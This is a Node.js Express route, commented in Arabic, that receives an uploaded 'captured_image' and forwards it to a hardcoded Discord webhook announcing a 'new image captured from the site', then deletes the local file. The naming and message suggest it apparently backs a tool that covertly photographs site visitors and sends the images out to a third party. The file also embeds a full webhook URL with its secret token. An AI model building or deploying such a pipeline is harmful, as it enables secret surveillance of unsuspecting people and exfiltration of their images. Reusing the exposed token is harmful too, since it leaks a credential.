// تأكد أن هذه المكتبات مستدعاة في أعلى ملف server.js إذا لم تكن موجودة
const FormData = require('form-data');
const axios = require('axios');
const fs = require('fs');

// دالة استقبال الصور وإرسالها إلى ديسكورد
app.post('/api/upload', upload.single('captured_image'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'لم يتم استقبال أي صورة' });
    }

    console.log(`📸 تم استقبال صورة محلياً وجاري نقلها لديسكورد: ${req.file.filename}`);

    try {
        // تجهيز البيانات بصيغة Form Data لإرسال الملف
        const discordData = new FormData();
        discordData.append('file', fs.createReadStream(req.file.path), req.file.filename);
        discordData.append('content', '🚨 **تم التقاط صورة جديدة من الموقع!**');

        // ضع رابط الـ Webhook الخاص بك هنا بين العلامتين ''
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1525465698317373540/iGdJxuIPPgFXaxss4xX0LjUEnsvZ1cR5ZG8AtqHWtzuusLUpGN27kNNvTm6Kh0IAamma';

        // إرسال الصورة عبر طلب POST إلى ديسكورد
        await axios.post(DISCORD_WEBHOOK_URL, discordData, {
            headers: discordData.getHeaders(),
        });

        console.log('🚀 تم إرسال الصورة بنجاح إلى قناة ديسكورد!');
        
        // مسح الصورة محلياً من سيرفر Render للحفاظ على المساحة
        fs.unlinkSync(req.file.path); 

        return res.status(200).json({ message: 'تم إرسال الصورة إلى ديسكورد بنجاح!' });

    } catch (error) {
        console.error('خطأ أثناء إرسال الصورة إلى ديسكورد:', error.message);
        
        // مسح الصورة حتى في حالة الفشل لتجنب تراكم الملفات
        if (fs.existsSync(req.file.path)) {
            fs.unlinkSync(req.file.path);
        }
        
        return res.status(500).json({ error: 'فشل إرسال الصورة للوجهة النهائية' });
    }
});
